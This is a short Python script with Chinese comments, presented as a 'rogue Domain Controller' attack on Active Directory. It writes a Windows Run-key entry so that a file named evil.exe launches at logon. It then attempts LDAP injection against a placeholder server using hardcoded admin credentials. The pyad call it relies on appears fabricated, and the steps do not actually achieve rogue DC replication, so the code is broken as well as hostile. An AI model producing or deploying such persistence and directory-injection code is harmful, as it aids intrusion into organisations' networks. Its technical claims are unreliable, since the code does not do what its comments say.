import winreg
import pyad
from ldap3 import Server, Connection

def create_rogue_dc():
    # 使用 winreg 套件註冊偽造的Domain Controller
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(key, "RogueDC", 0, winreg.REG_SZ, "C:\\evil\\evil.exe")

    # 使用 pyad 套件模擬rogue DC行為
    pyad.set_defaults(ldap_server="roguedc.example.com")
    try:
        pyad.sync_ad_object("CN=RogueDC,OU=Domain Controllers,DC=example,DC=com")
        print("Rogue Domain Controller created successfully.")
    except Exception as e:
        print("Failed to create Rogue Domain Controller:", str(e))

    # 使用 ldap3 套件注入和複製變更到AD基礎架構
    server = Server("roguedc.example.com", port=389)
    conn = Connection(server, user="admin@example.com", password="password")
    conn.bind()
    conn.add("DC=example,DC=com", {"objectClass": ["top", "domain"], "dc": "example"})

# 呼叫 create_rogue_dc 函數來執行 Rogue Domain Controller 功能
create_rogue_dc()